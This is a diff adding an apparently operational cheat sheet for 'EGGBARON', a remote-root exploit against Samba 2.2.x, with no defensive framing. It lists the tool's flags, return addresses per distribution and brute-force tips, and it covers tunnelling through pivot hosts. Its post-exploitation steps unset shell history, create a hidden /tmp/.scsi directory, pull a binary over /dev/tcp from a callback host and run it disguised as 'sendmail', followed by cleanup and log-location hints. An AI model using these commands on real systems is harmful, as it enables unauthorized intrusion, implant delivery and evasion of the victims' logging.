@@ -1,0 +1,143 @@
+###################################
+# EGGBARON
+###################################
+
+### Linux and FreeBSD systems running Samba 2.2.x (pre 2.2.8a) on x86
+architectures.
+
+### If successful, it has samba start a listener on port 45295 and the exploit
+will attempt
+###     to connect to it to give you root.  
+### If you're redirecting, you need to set up a tunnel to port 45295 on the
+target,
+###     then connect to it via netcat.
+### Note, that if you use the same ports on both tunnel ends, eggbaron may
+think that it
+###     was already successful because of false positives by the tunnel
+### Might need to let it give "failed" messages 20-30 times before it works.
+
+./sambal 
+samba-2.2.x < remote root 
+--------------------------
+Usage: ./sambal [-bBcCdfprsStv] [host]
+
+-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and
+prior, 
+                            3 = OpenBSD 3.2)
+-B <step>       bruteforce steps (default = 300)
+-c <ip address> connectback ip address
+-C <max childs> max childs for scan/bruteforce mode (default = 40)
+-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
+-f              force
+-p <port>       port to attack (default = 139)
+-r <ret>        return address
+-s              scan mode (random)
+-S <network>    scan mode
+-t <type>       presets (0 for a list)
+-v              verbose mode
+
+./sambal -t0
+samba-2.2.x < remote root 
+--------------------------
+01. samba-2.2.x - Debian 3.0                      [0xbffffea2]
+02. samba-2.2.x - Gentoo 1.4.x                    [0xbfffe890]
+03. samba-2.2.x - Mandrake 8.x                    [0xbffff6a0]
+04. samba-2.2.x - Mandrake 9.0                    [0xbfffe638]
+05. samba-2.2.x - Redhat 9.0                      [0xbffff7cc]
+06. samba-2.2.x - Redhat 8.0                      [0xbffff2f0]
+07. samba-2.2.x - Redhat 7.x                      [0xbffff310]
+08. samba-2.2.x - Redhat 6.x                      [0xbffff2f0]
+09. samba-2.2.x - Slackware 9.0                   [0xbffff574]
+10. samba-2.2.x - Slackware 8.x                   [0xbffff574]
+11. samba-2.2.x - SuSE 7.x                        [0xbffffbe6]
+12. samba-2.2.x - SuSE 8.x                        [0xbffff8f8]
+13. samba-2.2.x - FreeBSD 5.0                     [0xbfbff374]
+14. samba-2.2.x - FreeBSD 4.x                     [0xbfbff374]
+15. samba-2.2.x - NetBSD 1.6                      [0xbfbfd5d0]
+16. samba-2.2.x - NetBSD 1.5                      [0xbfbfd520]
+17. samba-2.2.x - OpenBSD 3.2                     [0x00159198]
+18. samba-2.2.8 - OpenBSD 3.2 (package)           [0x001dd258]
+19. samba-2.2.7 - OpenBSD 3.2 (package)           [0x001d9230]
+20. samba-2.2.5 - OpenBSD 3.2 (package)           [0x001d6170]
+21. Crash (All platforms)                         [0xbade5dee]
+
+# EGGBARON may not work the first time using the target number as the -t flag. 
+# Try bruteforcing it using the -b flag. This usually works, and after very
+# few tries. 
+# If this is taking a long time, try setting the bruteforce step size down
+# using -b 100. 
+# Subsequently, the -t flag will work 
+
+
+
+./sambal -b 0 TARGET_IP
+
+####### redirected:
+
+### via pitch:
+-tunnel
+l 1139 TARGET_IP 139
+l 4444 TARGET_IP 45295
+r NETCAT_PORT
+
+### Locally:
+./sambal -p 1139 -b 0 127.0.0.1
+./sambal -f -p 1139 -b 0 127.0.0.1
+
+# skip to nc section
+
+
+### Thru a windows box:
+### 1.  Need a 2 second delay (-d 2000000)
+### 2.  Need three tunnels (exploit, nc to port 45295, and callback to upload
+RAT)
+
+background redirect -tcp -lplisten 4444 -target 10.1.1.3 45295 -bind
+WINDOWS_LOCAL
+background redirect -tcp -lplisten 1139 -target 10.1.1.3 139 -bind
+WINDOWS_LOCAL
+background redirect -tcp -implantlisten 25896 -target LOCAL_UNIX 25896 -nodes
+40 
+
+
+### Locally:
+./sambal -t0
+./sambal -r 0xbffffb00 -b 0 -B 300 -v -c WINDOWS_TARG_CALLBACK -C 1 -f -d
+2000000 -p 1139 WIN_LOCAL
+./sambal -r 0xbffffd00 -b 0 -B 300 -v -c WINDOWS_TARG_CALLBACK -C 1 -f -d
+2000000 -p 1139 WIN_LOCAL
+
+
+### try connecting via netcat after any "session failed" message when
+redirecting:
+nc PITCH_IP_or_WINDOWS_LOCAL 4444
+unset HISTSIZE
+unset HISTFILESIZE
+unset HISTFILE
+w
+uname -a
+### start a netcat with the right nopen version (don't need to uuencode with
+/dev/tcp way)
+###  nc -l -v -p NETCAT_PORT < sendmail
+pwd
+mkdir /tmp/.scsi; cd /tmp/.scsi; pwd
+ls -l /usr/bin/uudecode
+/bin/cat</dev/tcp/WINDOWS_TARG_CALLBACK/NETCAT_PORT>/tmp/.scsi/sendmail
+chmod 700 sendmail
+PATH=. sendmail
+id
+
+### Cleanup
+# look for stray process in netstat (bunch of funky chars followed by /bin/sh
+# on port 45295)
+# then kill the associated process running it:
+netstat -anlp | grep 45295
+ps -ef |grep <PID>
+kill -9 <PID>
+
+
+# Logging depends on OS; usually indicated in smb.conf file or check:
+# /var/log/samba/smb.log, /var/log/samba/<machine-name>.log 
+
+### 
+
